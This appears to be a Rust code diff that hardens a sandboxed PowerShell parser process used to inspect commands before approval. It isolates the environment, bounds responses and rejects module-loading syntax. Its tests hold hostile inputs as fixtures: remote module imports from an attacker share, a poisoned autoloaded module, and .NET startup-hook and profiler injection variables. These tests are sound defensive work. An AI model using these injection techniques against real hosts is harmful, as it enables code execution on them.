@@ -2,8 +2,6 @@ use base64::Engine;
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
 #[cfg(windows)]
 use codex_utils_absolute_path::AbsolutePathBuf;
-use serde::Deserialize;
-use serde::Serialize;
 use std::collections::HashMap;
 #[cfg(windows)]
 use std::ffi::OsString;
@@ -22,7 +20,10 @@ use std::sync::LazyLock;
 use std::sync::Mutex;
 use std::sync::PoisonError;
 
+use super::powershell_preparse::requires_preparse_rejection;
+
 const POWERSHELL_PARSER_SCRIPT: &str = include_str!("powershell_parser.ps1");
+const MAX_POWERSHELL_RESPONSE_LINE_BYTES: usize = 8 * 1024 * 1024;
 #[cfg(any(test, windows))]
 const WINDOWS_POWERSHELL_SUFFIX: &str = r"WindowsPowerShell\v1.0\powershell.exe";
 #[cfg(any(test, windows))]
@@ -66,10 +67,10 @@ pub(crate) enum TrustedPowerShellFlavor {
 /// Unlike [`try_parse_powershell_ast_commands`], parser selection here is independent of a
 /// runtime command's executable spelling. This lets callers inspect an untrusted runtime wrapper
 /// without ever spawning that wrapper before approval.
-pub(crate) fn try_parse_powershell_ast_commands_with_trusted_flavor(
+pub(crate) fn parse_powershell_ast_commands_with_trusted_flavor(
     flavor: TrustedPowerShellFlavor,
     script: &str,
-) -> Option<Vec<Vec<String>>> {
+) -> PowershellParseOutcome {
     #[cfg(windows)]
     {
         let parser_executable = match flavor {
@@ -81,17 +82,17 @@ pub(crate) fn try_parse_powershell_ast_commands_with_trusted_flavor(
                 TrustedPowerShellRoot::ProgramFiles,
                 WINDOWS_PWSH_SUFFIX,
             ),
-        }?;
-        match parse_with_powershell_ast(&parser_executable, script) {
-            PowershellParseOutcome::Commands(commands) => Some(commands),
-            PowershellParseOutcome::Unsupported | PowershellParseOutcome::Failed => None,
-        }
+        };
+        let Some(parser_executable) = parser_executable else {
+            return PowershellParseOutcome::Failed;
+        };
+        parse_with_powershell_ast(&parser_executable, script)
     }
 
     #[cfg(not(windows))]
     {
         let _ = (flavor, script);
-        None
+        PowershellParseOutcome::Failed
     }
 }
 
@@ -272,8 +273,8 @@ fn trusted_windows_root(root: TrustedPowerShellRoot) -> std::io::Result<PathBuf>
     Ok(path)
 }
 
-#[derive(Debug, PartialEq, Eq)]
-pub(super) enum PowershellParseOutcome {
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub(crate) enum PowershellParseOutcome {
     Commands(Vec<Vec<String>>),
     Unsupported,
     Failed,
@@ -341,7 +342,14 @@ struct PowershellParserProcess {
 
 impl PowershellParserProcess {
     fn spawn(executable: &Path) -> std::io::Result<Self> {
-        let mut child = Command::new(executable)
+        let mut command = Command::new(executable);
+        Self::spawn_command(executable, &mut command)
+    }
+
+    fn spawn_command(_executable: &Path, command: &mut Command) -> std::io::Result<Self> {
+        #[cfg(windows)]
+        configure_trusted_parser_environment(_executable, command)?;
+        let mut child = command
             .args([
                 "-NoLogo",
                 "-NoProfile",
@@ -376,23 +384,24 @@ impl PowershellParserProcess {
     }
 
     fn parse(&mut self, script: &str) -> std::io::Result<PowershellParseOutcome> {
+        // PowerShell performs semantic work after parsing, including module and DSC discovery.
+        // Reject those language forms before sending attacker-controlled source to ParseInput.
+        if requires_preparse_rejection(script) {
+            return Ok(PowershellParseOutcome::Unsupported);
+        }
+
         let request = PowershellParserRequest {
             id: self.next_request_id,
             payload: encode_powershell_base64(script),
         };
         self.next_request_id = self.next_request_id.wrapping_add(1);
-        let mut request_json = serialize_request(&request)?;
-        request_json.push('\n');
-        self.stdin.write_all(request_json.as_bytes())?;
+        let mut request_line = serialize_request(&request)?;
+        request_line.push('\n');
+        self.stdin.write_all(request_line.as_bytes())?;
         self.stdin.flush()?;
 
-        let mut response_line = String::new();
-        if self.stdout.read_line(&mut response_line)? == 0 {
-            return Err(std::io::Error::new(
-                ErrorKind::UnexpectedEof,
-                "PowerShell parser closed stdout",
-            ));
-        }
+        let response_line =
+            read_bounded_response_line(&mut self.stdout, MAX_POWERSHELL_RESPONSE_LINE_BYTES)?;
 
         let response = deserialize_response(&response_line)?;
         // Requests are serialized today; the id still catches protocol desyncs if stdout is
@@ -410,6 +419,68 @@ impl PowershellParserProcess {
 
         Ok(response.into_outcome())
     }
+}
+
+#[cfg(windows)]
+fn configure_trusted_parser_environment(
+    executable: &Path,
+    command: &mut Command,
+) -> std::io::Result<()> {
+    let parser_home = executable.parent().ok_or_else(|| {
+        std::io::Error::new(
+            ErrorKind::InvalidInput,
+            "trusted PowerShell parser has no parent directory",
+        )
+    })?;
+    let parser_home = canonicalize_trusted_windows_path(parser_home)?;
+    let system_dir = trusted_windows_root(TrustedPowerShellRoot::System)?;
+    let system_dir = canonicalize_trusted_windows_path(&system_dir)?;
+    let windows_dir = system_dir.parent().ok_or_else(|| {
+        std::io::Error::new(
+            ErrorKind::InvalidInput,
+            "Windows System known folder has no parent directory",
+        )
+    })?;
+
+    command
+        .env_clear()
+        .env("SystemRoot", windows_dir)
+        .env("WINDIR", windows_dir)
+        .env("PSModulePath", "")
+        .env("POWERSHELL_TELEMETRY_OPTOUT", "1")
+        .env("POWERSHELL_UPDATECHECK", "Off")
+        .current_dir(parser_home);
+    Ok(())
+}
+
+fn read_bounded_response_line(
+    reader: &mut impl BufRead,
+    max_bytes: usize,
+) -> std::io::Result<String> {
+    let mut line = String::new();
+    let limit = u64::try_from(max_bytes)
+        .map_err(|_| invalid_response("response limit does not fit in u64"))?
+        .saturating_add(1);
+    let mut limited = std::io::Read::take(reader, limit);
+    let bytes_read = limited.read_line(&mut line)?;
+    if bytes_read == 0 {
+        return Err(std::io::Error::new(
+            ErrorKind::UnexpectedEof,
+            "PowerShell parser closed stdout",
+        ));
+    }
+    if bytes_read > max_bytes {
+        return Err(invalid_response(
+            "PowerShell parser response exceeded the limit",
+        ));
+    }
+    if !line.ends_with('\n') {
+        return Err(std::io::Error::new(
+            ErrorKind::UnexpectedEof,
+            "PowerShell parser response was not newline-terminated",
+        ));
+    }
+    Ok(line)
 }
 
 impl Drop for PowershellParserProcess {
@@ -437,35 +508,111 @@ fn take_child_stdout(child: &mut Child) -> std::io::Result<BufReader<ChildStdout
 }
 
 fn serialize_request(request: &PowershellParserRequest) -> std::io::Result<String> {
-    serde_json::to_string(request).map_err(|error| {
-        std::io::Error::new(
+    if request.payload.contains(['\t', '\r', '\n']) {
+        return Err(std::io::Error::new(
             ErrorKind::InvalidData,
-            format!("failed to serialize PowerShell parser request: {error}"),
-        )
-    })
+            "PowerShell parser request payload contains a framing delimiter",
+        ));
+    }
+    Ok(format!("{}\t{}", request.id, request.payload))
 }
 
 fn deserialize_response(response_line: &str) -> std::io::Result<PowershellParserResponse> {
-    serde_json::from_str(response_line).map_err(|error| {
-        std::io::Error::new(
-            ErrorKind::InvalidData,
-            format!("failed to parse PowerShell parser response: {error}"),
-        )
+    let response_line = response_line.trim_end_matches(['\r', '\n']);
+    let mut fields = response_line.splitn(3, '\t');
+    let id = fields
+        .next()
+        .ok_or_else(|| invalid_response("missing request id"))?
+        .parse::<u64>()
+        .map_err(|_| invalid_response("invalid request id"))?;
+    let status = fields
+        .next()
+        .ok_or_else(|| invalid_response("missing status"))?
+        .to_string();
+    let payload = fields
+        .next()
+        .ok_or_else(|| invalid_response("missing payload"))?;
+    let commands = if status == "ok" {
+        Some(decode_commands_payload(payload)?)
+    } else {
+        if !payload.is_empty() {
+            return Err(invalid_response("non-ok response contains a payload"));
+        }
+        None
+    };
+
+    Ok(PowershellParserResponse {
+        id,
+        status,
+        commands,
     })
 }
 
-#[derive(Serialize)]
 struct PowershellParserRequest {
     id: u64,
     payload: String,
 }
 
-#[derive(Deserialize)]
-#[serde(deny_unknown_fields)]
+#[derive(Debug, PartialEq, Eq)]
 struct PowershellParserResponse {
     id: u64,
     status: String,
     commands: Option<Vec<Vec<String>>>,
+}
+
+fn decode_commands_payload(payload: &str) -> std::io::Result<Vec<Vec<String>>> {
+    let bytes = BASE64_STANDARD
+        .decode(payload)
+        .map_err(|_| invalid_response("commands payload is not valid base64"))?;
+    let mut offset = 0usize;
+    let command_count = read_payload_u32(&bytes, &mut offset)?;
+    let command_count = usize::try_from(command_count)
+        .map_err(|_| invalid_response("command count does not fit in usize"))?;
+    let mut commands = Vec::with_capacity(command_count.min(bytes.len()));
+
+    for _ in 0..command_count {
+        let word_count = read_payload_u32(&bytes, &mut offset)?;
+        let word_count = usize::try_from(word_count)
+            .map_err(|_| invalid_response("word count does not fit in usize"))?;
+        let mut command = Vec::with_capacity(word_count.min(bytes.len()));
+        for _ in 0..word_count {
+            let word_len = read_payload_u32(&bytes, &mut offset)?;
+            let word_len = usize::try_from(word_len)
+                .map_err(|_| invalid_response("word length does not fit in usize"))?;
+            let word_end = offset
+                .checked_add(word_len)
+                .filter(|end| *end <= bytes.len())
+                .ok_or_else(|| invalid_response("word extends beyond commands payload"))?;
+            let word = std::str::from_utf8(&bytes[offset..word_end])
+                .map_err(|_| invalid_response("command word is not valid UTF-8"))?;
+            command.push(word.to_string());
+            offset = word_end;
+        }
+        commands.push(command);
+    }
+
+    if offset != bytes.len() {
+        return Err(invalid_response("commands payload has trailing data"));
+    }
+    Ok(commands)
+}
+
+fn read_payload_u32(bytes: &[u8], offset: &mut usize) -> std::io::Result<u32> {
+    let end = offset
+        .checked_add(4)
+        .filter(|end| *end <= bytes.len())
+        .ok_or_else(|| invalid_response("commands payload ended before a length field"))?;
+    let value = u32::from_le_bytes(
+        bytes[*offset..end]
+            .try_into()
+            .map_err(|_| invalid_response("invalid length field"))?,
+    );
+    *offset = end;
+    Ok(value)
+}
+
+fn invalid_response(message: &str) -> std::io::Error {
+    std::io::Error::new(ErrorKind::InvalidData, message)
 }
 
 impl PowershellParserResponse {
@@ -487,6 +634,10 @@ impl PowershellParserResponse {
     }
 }
 
+#[cfg(test)]
+#[path = "powershell_parser_response_tests.rs"]
+mod response_tests;
+
 fn kill_child(child: &mut Child) {
     let _ = child.kill();
     let _ = child.wait();
@@ -500,6 +651,10 @@ mod trust_tests;
 mod tests {
     use super::*;
     use pretty_assertions::assert_eq;
+
+    fn words(items: &[&str]) -> Vec<String> {
+        items.iter().map(ToString::to_string).collect()
+    }
 
     #[test]
     fn production_resolver_handles_multiple_windows_powershell_requests() {
@@ -607,6 +762,123 @@ mod tests {
             .parse("using module ./codex_poc.psm1\nGet-Content Cargo.toml")
             .unwrap();
         assert_eq!(parsed, PowershellParseOutcome::Unsupported);
+    }
+
+    #[test]
+    fn parser_process_rejects_preparse_and_script_requirement_forms() {
+        let powershell = trusted_windows_powershell_parser();
+        let mut parser = PowershellParserProcess::spawn(&powershell).unwrap();
+
+        for script in [
+            "#Requires -Modules CodexProbe\nGet-Content Cargo.toml",
+            "Get-Content Cargo.toml\n#Requires -Modules C:\\workspace\\CodexProbe.psm1",
+            "#Requires -Modules C:\\workspace\\CodexProbe.psd1\nGet-Content Cargo.toml",
+            r#"#Requires -Modules @{ ModuleName = "CodexProbe"; ModuleVersion = "1.0" }
+Get-Content Cargo.toml"#,
+            "#Requires -Version 5.1\nGet-Content Cargo.toml",
+            "UsInG MoDuLe '\\\\attacker\\share\\Evil.psd1'\nGet-Content Cargo.toml",
+            "configuration CodexProbe { Import-DscResource -ModuleName '\\\\attacker\\share\\Evil.psd1' }",
+        ] {
+            assert_eq!(
+                parser.parse(script).unwrap(),
+                PowershellParseOutcome::Unsupported,
+                "pre-parser construct must be unsupported: {script:?}",
+            );
+        }
+    }
+
+    #[test]
+    fn parser_process_isolates_inherited_environment_and_module_search() {
+        let temp = tempfile::tempdir().unwrap();
+        let marker = temp.path().join("autoload-marker");
+        let marker_for_powershell = marker.to_string_lossy().replace('\'', "''");
+        let module_dir = temp
+            .path()
+            .join("Modules")
+            .join("Microsoft.PowerShell.Utility");
+        std::fs::create_dir_all(&module_dir).unwrap();
+        std::fs::write(
+            module_dir.join("Microsoft.PowerShell.Utility.psd1"),
+            r#"@{
+    RootModule = 'Microsoft.PowerShell.Utility.psm1'
+    ModuleVersion = '1.0.0'
+    GUID = '4ce19c99-2640-4f33-94e1-b7f1dc95306e'
+    FunctionsToExport = @('ConvertFrom-Json', 'ConvertTo-Json')
+}"#,
+        )
+        .unwrap();
+        std::fs::write(
+            module_dir.join("Microsoft.PowerShell.Utility.psm1"),
+            r#"[System.IO.File]::WriteAllText('__MARKER__', 'autoloaded')
+function ConvertFrom-Json { process { @{ id = 0; payload = '' } } }
+function ConvertTo-Json { process { 'poisoned' } }
+"#
+            .replace("__MARKER__", &marker_for_powershell),
+        )
+        .unwrap();
+
+        let mut executables = vec![trusted_windows_powershell_parser()];
+        if let Some(pwsh) = trusted_standard_pwsh_invocation_path() {
+            executables.push(pwsh);
+        }
+
+        for (index, executable) in executables.into_iter().enumerate() {
+            let mut command = Command::new(&executable);
+            command.env("PSModulePath", temp.path().join("Modules"));
+            for name in [
+                "DOTNET_STARTUP_HOOKS",
+                "DOTNET_ADDITIONAL_DEPS",
+                "DOTNET_SHARED_STORE",
+                "DOTNET_ROOT",
+                "CORECLR_PROFILER_PATH",
+                "COR_PROFILER_PATH",
+                "PATH",
+                "HOME",
+                "USERPROFILE",
+                "APPDATA",
+                "LOCALAPPDATA",
+            ] {
+                command.env(name, temp.path());
+            }
+            command
+                .env("CORECLR_ENABLE_PROFILING", "1")
+                .env("CORECLR_PROFILER", "{4CE19C99-2640-4F33-94E1-B7F1DC95306E}")
+                .env("COR_ENABLE_PROFILING", "1")
+                .env("COR_PROFILER", "{4CE19C99-2640-4F33-94E1-B7F1DC95306E}")
+                .env("COMPlus_ReadyToRun", "0")
+                .current_dir(temp.path());
+            let mut parser =
+                PowershellParserProcess::spawn_command(&executable, &mut command).unwrap();
+
+            for (script, expected) in [
+                (
+                    "# ordinary comment\nGet-Content Cargo.toml",
+                    PowershellParseOutcome::Commands(vec![words(&["Get-Content", "Cargo.toml"])]),
+                ),
+                (
+                    "Write-Output 'fóó'; Measure-Object",
+                    PowershellParseOutcome::Commands(vec![
+                        words(&["Write-Output", "fóó"]),
+                        words(&["Measure-Object"]),
+                    ]),
+                ),
+                ("", PowershellParseOutcome::Unsupported),
+                (
+                    "Get-Content repeated.txt",
+                    PowershellParseOutcome::Commands(vec![words(&["Get-Content", "repeated.txt"])]),
+                ),
+            ] {
+                assert_eq!(
+                    parser.parse(script).unwrap(),
+                    expected,
+                    "protected parser {executable:?} request {index} must work in isolation",
+                );
+            }
+            assert!(
+                !marker.exists(),
+                "protected parser {executable:?} loaded user-controlled startup code",
+            );
+        }
     }
 
     #[test]
